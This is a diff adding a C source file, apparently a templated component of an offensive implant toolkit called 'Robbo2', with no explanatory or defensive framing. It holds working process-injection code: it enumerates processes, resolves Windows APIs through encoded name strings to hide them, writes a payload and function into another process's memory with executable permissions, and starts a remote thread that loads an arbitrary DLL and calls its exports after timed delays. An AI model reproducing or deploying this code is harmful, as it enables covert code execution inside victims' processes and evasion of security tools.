@@ -1,0 +1,350 @@
+#!name##Robbo2Proc_C
+#!itemType##sfile
+#!info##Robbo2 Proc C file.
+#!lang##c
+#!addNameComp##True
+
+#include "robbo2_proc.h"
+
+#define ROBBO_PROC_DEFAULT_PROCESS_NAME_SIZE 256
+#define ROBBO_PROC_DEFAULT_PROC_FPATH_SIZE 2048
+#define ROBBO_PROC_DEFAULT_PID_LIST_SIZE 1024
+#define ROBBO_PROC_DEFAULT_FILE_NAME_BUFF 1024
+
+// QueryFullProcessImageNameW
+int raw_name_QueryFullProcessImageNameW[] = {
+    {{_ROBBO.EncodeStr("QueryFullProcessImageNameW")}}
+};
+
+// GetProcAddress
+int raw_name_GetProcAddress[] = {
+    {{_ROBBO.EncodeStr("GetProcAddress")}}
+};
+
+// --------- WINAPI functions -------
+BOOL robbo_wapi_QueryFullProcessImageNameW(HANDLE proc_handle, DWORD dwFlags, LPWSTR buff_path, PDWORD buff_size) {
+    Rtype_QueryFullProcessImageNameW proc_fpath = robbo_get_function(raw_name_QueryFullProcessImageNameW, robbo_addr_kernel32);
+    return proc_fpath(proc_handle, dwFlags, buff_path, buff_size);
+}
+
+Rtype_QueryFullProcessImageNameW robbo_faddr_QueryFullProcessImageNameW(void) {
+    return robbo_get_function(raw_name_QueryFullProcessImageNameW, robbo_addr_kernel32);
+}
+
+Rtype_GetProcAddress robbo_faddr_GetProcAddress(void) {
+    return robbo_get_function(raw_name_GetProcAddress, robbo_addr_kernel32);
+}
+
+// ---------- ROBBO FUNCTIONS -----------
+
+void robbo_rproc_clear_pid_list(pROBBO_PROC_PID_LIST pids) {
+    free(pids->list);
+    free(pids);
+}
+
+
+void robbo_rproc_clear_process(pROBBO_PROCESS proc) {
+    if (!proc) {
+        return;
+    }
+    free(proc->name);
+    free(proc->fpath_std);
+    free(proc->fpath_wchar);
+    free(proc->fpath_nt);
+    free(proc);
+}
+
+void robbo_rproc_clear_proc_list(pROBBO_PROCESS_LIST proc_list) {
+    pROBBO_PROCESS proc = proc_list->first;
+    pROBBO_PROCESS temp;
+    for (int i=0; i<proc_list->size; i++) {
+        temp = proc->next;
+        proc->clear(proc);
+        proc = temp;
+    }
+    free(proc_list);
+}
+
+pROBBO_PROC_PID_LIST robbo_proc_get_pid_list(int list_size) {
+    size_t mem_size = list_size * sizeof(DWORD);
+    DWORD *raw_list = malloc(mem_size);
+    memset(raw_list, 0, mem_size);
+    DWORD bWritten;
+    robbo_wapi_EnumProcesses(raw_list, list_size, &bWritten);
+    int proc_num = 0;
+    for (int i=0; i<list_size ; i++) {
+        if (raw_list[i] == 0 & raw_list[i+1] == 0) {
+            break;
+        }
+        if (raw_list[i] == 0) {
+            continue;
+        }
+        proc_num++;
+    }
+    DWORD *pid_list = malloc(sizeof(DWORD) * proc_num);
+    memset(pid_list, 0, proc_num * sizeof(DWORD));
+    for (int i=0; i<proc_num; i++) {
+        pid_list[i] = raw_list[i];
+    }
+    pROBBO_PROC_PID_LIST pList = malloc(sizeof(ROBBO_PROC_PID_LIST));
+    memset(pList, 0, sizeof(ROBBO_PROC_PID_LIST));
+    pList->list = pid_list;
+    pList->size = proc_num;
+    pList->clear = robbo_rproc_clear_pid_list;
+    free(raw_list);
+    return pList;
+}
+
+pROBBO_PROCESS robbo_proc_get_process(DWORD pid) {
+    pROBBO_PROCESS proc = malloc(sizeof(ROBBO_PROCESS));
+    memset(proc, 0, sizeof(ROBBO_PROCESS));
+    proc->handle = NULL;
+    proc->name = NULL;
+    proc->fpath_std = NULL;
+    proc->fpath_wchar = NULL;
+    proc->fpath_nt = NULL;
+    proc->next = NULL;
+    proc->pid = pid;
+    proc->clear = robbo_rproc_clear_process;
+    proc->handle = robbo_locust_open_process_info(pid);
+    if (proc->handle == 0) {
+        proc->error = 1;
+        return proc;
+    }
+    char *raw_name = malloc(ROBBO_PROC_DEFAULT_PROCESS_NAME_SIZE);
+    memset(raw_name, 0, ROBBO_PROC_DEFAULT_PROCESS_NAME_SIZE);
+    robbo_wapi_GetModuleBaseNameA(proc->handle, 0, raw_name, ROBBO_PROC_DEFAULT_PROCESS_NAME_SIZE);
+    proc->name_size = strlen(raw_name);
+    proc->name = malloc(proc->name_size + 1);
+    memset(proc->name, 0, proc->name_size + 1);
+    strcpy(proc->name, raw_name);
+    free(raw_name);
+    WCHAR *raw_fpath = malloc(ROBBO_PROC_DEFAULT_PROC_FPATH_SIZE * sizeof(WCHAR));
+    memset(raw_fpath, 0, ROBBO_PROC_DEFAULT_PROC_FPATH_SIZE *sizeof(WCHAR));
+    DWORD rbuff_size = ROBBO_PROC_DEFAULT_PROC_FPATH_SIZE;
+    robbo_wapi_QueryFullProcessImageNameW(proc->handle, 0, raw_fpath, &rbuff_size);
+    proc->fpath_char_size = wcslen(raw_fpath);
+    size_t fpath_size = (proc->fpath_char_size + 1) * sizeof(WCHAR);
+    proc->fpath_wchar = malloc(fpath_size);
+    memset(proc->fpath_wchar, 0, fpath_size);
+    wcscpy(proc->fpath_wchar, raw_fpath);
+    memset(raw_fpath, 0, ROBBO_PROC_DEFAULT_PROC_FPATH_SIZE *sizeof(WCHAR));
+    rbuff_size = ROBBO_PROC_DEFAULT_PROC_FPATH_SIZE;
+    robbo_wapi_QueryFullProcessImageNameW(proc->handle, PROCESS_NAME_NATIVE, raw_fpath, &rbuff_size);
+    fpath_size = wcslen(raw_fpath);
+    proc->fpath_nt = malloc((fpath_size + 1) * sizeof(WCHAR));
+    memset(proc->fpath_nt, 0, (fpath_size + 1) * sizeof(WCHAR));
+    wcscpy(proc->fpath_nt, raw_fpath);
+    free(raw_fpath);
+    proc->fpath_std = malloc(proc->fpath_char_size + 1);
+    memset(proc->fpath_std, 0, proc->fpath_char_size + 1);
+    WideCharToMultiByte(CP_UTF8, 0, proc->fpath_wchar, -1, proc->fpath_std, proc->fpath_char_size + 1, 0, 0);
+    robbo_wapi_NtClose(proc->handle);
+    proc->handle = NULL;
+    return proc;
+}
+
+pROBBO_PROCESS_LIST robbo_proc_get_process_list(void) {
+    pROBBO_PROCESS_LIST plist = malloc(sizeof(ROBBO_PROCESS_LIST));
+    memset(plist, 0, sizeof(ROBBO_PROCESS_LIST));
+    plist->clear = robbo_rproc_clear_proc_list;
+    pROBBO_PROC_PID_LIST pids = robbo_proc_get_pid_list(ROBBO_PROC_DEFAULT_PID_LIST_SIZE);
+    pROBBO_PROCESS last;
+    int first_flag = 0;
+    int proc_count = 0;
+    for (int i=0; i<pids->size; i++) {
+        pROBBO_PROCESS proc = robbo_proc_get_process(pids->list[i]);
+        if (proc->error != 0) {
+            continue;
+        }
+        proc_count++;
+        if (first_flag == 0) {
+            plist->first = proc;
+            last = proc;
+            first_flag = 1;
+            continue;
+        }
+        last->next = proc;
+        last = proc;
+    }
+    plist->size = proc_count;
+    pids->clear(pids);
+    return plist;
+}
+
+pROBBO_PROCESS robbo_proc_find_process_first(char *process_name) {
+    pROBBO_PROC_PID_LIST pids = robbo_proc_get_pid_list(ROBBO_PROC_DEFAULT_PID_LIST_SIZE);
+    char *buff_name = malloc(ROBBO_PROC_DEFAULT_PROCESS_NAME_SIZE);
+   
+    HANDLE proc;
+    for (int i=0; i<pids->size; i++) {
+        proc = robbo_locust_open_process_info(pids->list[i]);
+        if (!proc) {
+            continue;
+        }
+        memset(buff_name, 0, ROBBO_PROC_DEFAULT_PROCESS_NAME_SIZE);
+        robbo_wapi_GetModuleBaseNameA(proc, 0, buff_name, ROBBO_PROC_DEFAULT_PROCESS_NAME_SIZE);
+        if (strcmp(process_name, buff_name) == 0) {
+            robbo_wapi_NtClose(proc);
+            pROBBO_PROCESS rProc = robbo_proc_get_process(pids->list[i]);
+            if (rProc->error != 0) {
+                rProc->clear(rProc);
+                continue;
+            }
+            pids->clear(pids);
+            free(buff_name);
+            return rProc;
+        }
+    }
+    free(buff_name);
+    pids->clear(pids);
+    return 0;
+}
+
+
+pROBBO_PAYLOAD_INJECT_DLL robbo_build_payload_dll_inject(char *dll_name, char *FirstFunc, char *arg1, int arg1_size, char *SecFunc, char *arg2, int arg2_size, DWORD pause_time, DWORD inj_delay) {
+    pROBBO_PAYLOAD_INJECT_DLL payload = malloc(sizeof(ROBBO_PAYLOAD_INJECT_DLL));
+    memset(payload, 0, sizeof(ROBBO_PAYLOAD_INJECT_DLL));
+    if (FirstFunc != 0) {
+        payload->exe_first_FLAG = 1;
+        strcpy(payload->exe_first_func_name, FirstFunc);
+        if (arg1_size != 0) {
+            memcpy(payload->arg1, arg1, arg1_size);
+            payload->arg1_size = arg1_size;
+        }
+    }
+    if (SecFunc != 0) {
+        payload->exe_sec_FLAG = 1;
+        strcpy(payload->exe_second_func_name, SecFunc);
+        if (arg2_size != 0) {
+            memcpy(payload->arg2, arg2, arg2_size);
+            payload->arg2_size = arg2_size;
+        }
+    }
+    if (pause_time != 0) {
+        payload->pause = pause_time;
+    }
+    payload->in_delay = inj_delay;
+    payload->PauseMe = robbo_faddr_Sleep();
+    payload->GetProcAddr = robbo_faddr_GetProcAddress();
+    payload->LdrLoadDll = robbo_faddr_LdrLoadDll();
+    robbo_convert_utf16(dll_name, payload->dll_name, ROBBO_PROC_PAYLOAD_DLL_NAME_BUFF);
+    robbo_wapi_RtlInitUnicodeString(&payload->dll_name_US, payload->dll_name);
+    return payload;
+}
+
+
+int robbo_proc_inject_dll(DWORD pid, pROBBO_PAYLOAD_INJECT_DLL payload) {
+    HANDLE proc = robbo_locust_open_process_full(pid);
+    if (proc == 0) {
+        return 0;
+    }
+    SIZE_T mem_payload = sizeof(ROBBO_PAYLOAD_INJECT_DLL) + 512;
+    SIZE_T payload_size = sizeof(ROBBO_PAYLOAD_INJECT_DLL);
+    SIZE_T func_size = (char*)robbo_proc_pfunc_inject_dll_end - (char*)robbo_proc_pfunc_inject_dll;
+    SIZE_T mem_func = func_size + 128;
+    SIZE_T func_pro;
+    SIZE_T payload_pro;
+    PVOID payload_addr = NULL;
+    PVOID func_addr = NULL;
+
+    NTSTATUS pay_alloc = robbo_wapi_NtAllocateVirtualMemory(proc, &payload_addr, 0, &mem_payload, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (pay_alloc != 0) {
+        goto IN_ERROR;
+    }
+
+    payload->dll_name_US.Buffer = (WCHAR*)payload_addr;
+
+    NTSTATUS wr_pay = robbo_wapi_NtWriteVirtualMemory(proc, payload_addr, payload, payload_size, &payload_pro);
+    if (wr_pay != 0) {
+        goto IN_ERROR;
+    }
+
+    NTSTATUS func_alloc = robbo_wapi_NtAllocateVirtualMemory(proc, &func_addr, 0, &mem_func, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (func_alloc != 0) {
+        goto IN_ERROR;
+    }
+
+    NTSTATUS wr_func = robbo_wapi_NtWriteVirtualMemory(proc, func_addr, robbo_proc_pfunc_inject_dll, func_size, &func_pro);
+    if (wr_func != 0 ) {
+        goto IN_ERROR;
+    }
+
+    HANDLE myTh;
+    NTSTATUS result = robbo_wapi_NtCreateThreadEx(&myTh, THREAD_ALL_ACCESS, 0, proc, func_addr, payload_addr, 0, 0, 0, 0, 0);
+    if (result == 0) {
+        robbo_wapi_NtClose(proc);
+        return 1;
+    }
+
+
+    IN_ERROR:
+        robbo_wapi_NtClose(proc);
+        return 0;
+
+}
+
+
+NTSTATUS robbo_proc_create_file(HANDLE file_handle, char *fpath, void *src_data, int data_size) {
+    WCHAR *raw_buff = malloc(ROBBO_PROC_DEFAULT_FILE_NAME_BUFF * sizeof(WCHAR));
+    memset(raw_buff, 0, ROBBO_PROC_DEFAULT_FILE_NAME_BUFF * sizeof(WCHAR));
+    WCHAR *wbuff = malloc(ROBBO_PROC_DEFAULT_FILE_NAME_BUFF * sizeof(WCHAR));
+    memset(wbuff, 0, ROBBO_PROC_DEFAULT_FILE_NAME_BUFF * sizeof(WCHAR));
+    robbo_convert_utf16(fpath, raw_buff, ROBBO_PROC_DEFAULT_FILE_NAME_BUFF * sizeof(WCHAR));
+    swprintf(wbuff, ROBBO_PROC_DEFAULT_FILE_NAME_BUFF * sizeof(WCHAR), L"\\??\\%ls", raw_buff);
+    free(raw_buff);
+    UNICODE_STRING us_path;
+    robbo_wapi_RtlInitUnicodeString(&us_path, wbuff);
+    OBJECT_ATTRIBUTES obj_att;
+    ROBBO_INITIALIZE_OBJECT_ATTRIBUTES(&obj_att, &us_path, OBJ_CASE_INSENSITIVE, NULL, NULL);
+    IO_STATUS_BLOCK io_status;
+    NTSTATUS cr_file = robbo_wapi_NtCreateFile(&file_handle, FILE_GENERIC_WRITE, &obj_att, &io_status, 0, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_WRITE, FILE_OVERWRITE_IF, FILE_RANDOM_ACCESS|FILE_NON_DIRECTORY_FILE|FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
+    if (cr_file != 0) {
+        free(wbuff);
+        return cr_file;
+    }
+    NTSTATUS wr_file = robbo_wapi_NtWriteFile(file_handle, 0, 0, 0, &io_status, src_data, (ULONG)data_size, 0, 0);
+    NTSTATUS cl_file = robbo_wapi_NtClose(file_handle);
+    free(wbuff);
+    return wr_file;
+}
+
+
+// --------------------------------------- PAYLOAD FUNCTIONS --------------------------------------------
+
+void WINAPI robbo_proc_pfunc_inject_dll(pROBBO_PAYLOAD_INJECT_DLL payload) {
+    if (payload->in_delay != 0) {
+        payload->PauseMe(payload->in_delay);
+    }
+    payload->LdrLoadDll(0, 0, &payload->dll_name_US, &payload->mod_handle);
+    if (payload->pause != 0) {
+        payload->PauseMe(payload->pause);
+    }
+    if (payload->exe_first_FLAG == 1) {
+        payload->exeFuncFirst = payload->GetProcAddr(payload->mod_handle, payload->exe_first_func_name);
+        if (payload->arg1_size != 0) {
+            payload->exeFuncFirst(payload->arg1);
+        }
+        else {
+            payload->exeFuncFirst(0);
+        }
+    }
+    if (payload->pause != 0) {
+        payload->PauseMe(payload->pause);
+    }
+    if (payload->exe_sec_FLAG == 1) {
+        payload->exeFuncSecond = payload->GetProcAddr(payload->mod_handle, payload->exe_second_func_name);
+        if (payload->arg2_size != 0) {
+            payload->exeFuncSecond(payload->arg2);
+        }
+        else {
+            payload->exeFuncSecond(0);
+        }
+    }
+    return;
+}
+
+void WINAPI robbo_proc_pfunc_inject_dll_end(void) {
+    return;
+}
+
